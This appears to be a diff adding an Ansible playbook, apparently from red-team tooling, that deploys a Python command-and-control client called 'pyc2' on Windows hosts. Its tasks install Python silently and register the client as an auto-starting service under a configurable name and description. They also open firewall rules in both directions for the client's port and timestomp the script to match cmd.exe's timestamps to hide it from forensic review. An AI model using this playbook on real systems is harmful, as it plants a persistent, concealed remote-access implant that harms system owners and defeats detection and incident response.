@@ -1,0 +1,78 @@
+- name: Download Python installer
+  win_get_url:
+    url: "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe"
+    dest: "C:\\Temp\\python-installer.exe"
+
+- name: Install Python silently
+  win_package:
+    path: "C:\\Temp\\python-installer.exe"
+    arguments: /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    product_id: "Python 3.11.8 (64-bit)"
+    creates_path: "C:\\Program Files\\Python311\\python.exe"
+
+- name: Remove the Python installer
+  win_file:
+    path: "C:\\Temp\\python-installer.exe"
+    state: absent
+
+- name: Copy Python client script
+  win_copy:
+    src: "files/client.py"
+    dest: "{{ pyc2_client_location_win }}"
+
+- name: Update users list in the script
+  win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^users=.*'
+    line: 'users="{{ doubletap_users }}"'
+
+- name: Create the Windows service using PowerShell
+  win_shell: |
+    $svcName = "{{ pyc2_service_name }}"
+    $scriptPath = "{{ pyc2_client_location_win }}"
+    $pythonPath = "C:\Program Files\Python311\python.exe"
+
+    if (-not (Get-Service -Name $svcName -ErrorAction SilentlyContinue)) {
+        New-Service -Name $svcName `
+                    -BinaryPathName "`"$pythonPath`" `"$scriptPath`"" `
+                    -DisplayName "{{ pyc2_service_name }}" `
+                    -Description "{{ pyc2_service_description }}" `
+                    -StartupType Automatic
+    }
+  args:
+    executable: powershell
+
+- name: Start the service
+  win_service:
+    name: "{{ pyc2_service_name }}"
+    state: started
+    start_mode: auto
+
+- name: Allow inbound traffic on port through Windows firewall
+  win_firewall_rule:
+    name: "{{ pyc2_firewall_name }}"
+    enable: yes
+    direction: in
+    localport: any
+    remoteport: "{{ pyc2_port }}"
+    protocol: TCP
+    action: allow
+
+- name: Allow outbound traffic on port through Windows firewall
+  win_firewall_rule:
+    name: "{{ pyc2_firewall_name }}"
+    enable: yes
+    direction: out
+    localport: any
+    remoteport: "{{ pyc2_port }}"
+    protocol: TCP
+    action: allow
+
+- name: Timestomp script to match cmd.exe
+  win_shell: |
+    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
+    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
+  args:
+    executable: powershell
